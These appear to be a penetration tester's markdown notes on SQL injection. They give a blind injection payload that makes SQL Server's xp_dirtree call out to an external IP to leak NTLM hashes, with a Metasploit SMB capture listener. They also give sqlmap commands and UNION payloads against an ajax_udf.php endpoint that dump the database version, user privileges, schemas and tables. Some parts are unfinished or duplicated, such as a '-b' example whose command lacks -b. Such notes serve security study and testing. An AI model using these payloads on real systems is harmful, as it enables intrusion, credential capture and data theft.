# SQL Injection

### Blind SQL Injection

* In the following evidence Trustwave injected a SQL query that calls SQL Server's xp_dirtree stored procedure with a UNC file path that references a URL on an external domain.
```JSON
...,"PaymentMethodId":"LL5WZKJLM6Q1B1');declare @q varchar(99);set @q='\\\\3.83.30.21'; exec master.dbo.xp_dirtree @q;--",...
```
* Application server interacted with the domain, indicating that the injected SQL query was executed. Since this was a UNC path, the host will try to authenticate to the remote server by passing the user’s password hash.
```
```
msf auxiliary(server/capture/smb) > run
Started Listener...
msf auxiliary(server/capture/smb) > SMB Captured....
[NTLM Hash]
```


### SQL UNION:
---

+ Usually at the end of a query:  
  `http://[host]/ajax_udf.php?q=1&add_value=*odm_user*`
  Becomes something like this:  
  `http://[host]/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9`

  Importantly you can select which tables to select from:
  ``

+ To get


#### SQLMap:
```
 sqlmap -u 'http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' -p 'add_value' --dbms=MySQL -os=Linux --technique=U --proxy http://10.0.0.4:8080 -v 2'
 ```

 + To get the banner (i.e. the version), add -b
  ```
  sqlmap -u 'http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' -p 'add_value' --dbms=MySQL -os=Linux --technique=U --proxy http://10.0.0.4:8080 -v 2'
  ```

  The URL changes to:
  ```
  /jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b707671%2CIFNULL%28CAST%28VERSION%28%29%20AS%20CHAR%29%2C0x20%29%2C0x716a767a71%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20JuOm
  ```

  Which is:
  ```
  /jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION ALL SELECT NULL,CONCAT(0x716b707671,IFNULL(CAST(VERSION() AS CHAR),0x20),0x716a767a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JuOm
  ```

+ To get users & privileges:
  ```
  /jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b707671%2CIFNULL%28CAST%28grantee%20AS%20CHAR%29%2C0x20%29%2C0x6d72726f6263%2CIFNULL%28CAST%28privilege_type%20AS%20CHAR%29%2C0x20%29%2C0x716a767a71%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.USER_PRIVILEGES--%20oZLD
  ```

  Which is:
  ```
  /jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION ALL SELECT NULL,CONCAT(0x716b707671,IFNULL(CAST(grantee AS CHAR),0x20),0x6d72726f6263,IFNULL(CAST(privilege_type AS CHAR),0x20),0x716a767a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.USER_PRIVILEGES-- oZLD
  ```

  SQL:
  SELECT CONCAT(0x716b707671,IFNULL(CAST(grantee AS CHAR),0x20),0x6d72726f6263,IFNULL(CAST(privilege_type AS CHAR),0x20),0x716a767a71) FROM INFORMATION_SCHEMA.USER_PRIVILEGES
  grantee AS CHAR
  privilege_type AS CHAR
  FROM INFORMATION_SCHEMA.USER_PRIVILEGES

+ To get all tables:
  ```
  /jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b707671%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%2C0x716a767a71%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20tQDD
  ```
  Then
  ```
  /jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b707671%2CIFNULL%28CAST%28table_schema%20AS%20CHAR%29%2C0x20%29%2C0x6d72726f6263%2CIFNULL%28CAST%28table_name%20AS%20CHAR%29%2C0x20%29%2C0x716a767a71%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x64727570616c37%2C0x696e666f726d6174696f6e5f736368656d61%2C0x6a61626364306373%2C0x6d7973716c%2C0x706572666f726d616e63655f736368656d61%2C0x7068706d7961646d696e%29--%20Jeqw
  ```

  Which is:
  ```
  /jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION ALL SELECT NULL,CONCAT(0x716b707671,IFNULL(CAST(schema_name AS CHAR),0x20),0x716a767a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- tQDD
  ```
  and
  ```
  /jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION ALL SELECT NULL,CONCAT(0x716b707671,IFNULL(CAST(table_schema AS CHAR),0x20),0x6d72726f6263,IFNULL(CAST(table_name AS CHAR),0x20),0x716a767a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64727570616c37,0x696e666f726d6174696f6e5f736368656d61,0x6a61626364306373,0x6d7973716c,0x706572666f726d616e63655f736368656d61,0x7068706d7961646d696e)-- Jeqw
  ```

  So:
  CONCAT(0x716b707671,
    IFNULL(CAST(schema_name AS CHAR)
  ,0x20),0x716a767a71)
  FROM INFORMATION_SCHEMA.SCHEMATA

  SELECT CONCAT(0x716b707671,IFNULL(CAST(table_schema AS CHAR),0x20),0x6d72726f6263,IFNULL(CAST(table_name AS CHAR),0x20)

  CONCAT(0x716b707671,
    IFNULL(CAST(table_schema AS CHAR),0x20),
    0x6d72726f6263,
    IFNULL(CAST(table_name AS CHAR),0x20),
    0x716a767a71)
  FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64727570616c37,0x696e666f726d6174696f6e5f736368656d61,0x6a61626364306373,0x6d7973716c,0x706572666f726d616e63655f736368656d61,0x7068706d7961646d696e)
